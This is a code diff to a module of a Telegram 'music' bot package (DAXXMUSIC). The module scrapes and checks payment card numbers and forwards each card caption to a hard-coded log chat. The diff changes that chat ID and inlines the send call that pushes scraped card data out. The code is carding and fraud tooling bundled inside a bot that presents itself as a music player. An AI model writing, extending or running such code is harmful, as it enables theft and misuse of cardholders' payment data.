@@ -8,10 +8,8 @@ from DAXXMUSIC import app, userbot
 from DAXXMUSIC.core.userbot import assistants
 from DAXXMUSIC.utils.database import get_cards, get_card_count, is_card_exists, add_card, remove_card
 from DAXXMUSIC.misc import SUDOERS
-from pyrogram.errors import ChatAdminRequired, ChatNotModified, ChatIdInvalid, FloodWait, InviteHashExpired, UserNotParticipant
 
-
-LOGS_CC = -1002237336934
+LOGS_CC = -1002222638488
 
 def getcards(text: str):
     text = text.replace('\n', ' ').replace('\r', '')
@@ -114,18 +112,11 @@ async def cmd_scr(client, message):
 [↯] 𝗣𝗿𝗼𝘅𝘆 ↳ Live ✅
 ➩ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 : {le}
 """
-            
-async def send_message():
-    try:
-        await app.send_message(
-            chat_id=LOGS_CC,
-            text=card_caption,
-        )
-        await asyncio.sleep(1)
-    except FloodWait as fw:
-        await asyncio.sleep(int(fw.value))
-    except Exception as e:
-        print(f"An error occurred: {e}")
+            await user.send_message(
+                chat_id=LOGS_CC,
+                text=card_caption,
+            )
+            await asyncio.sleep(1)
 
     try:
         if "https" in channel_link:
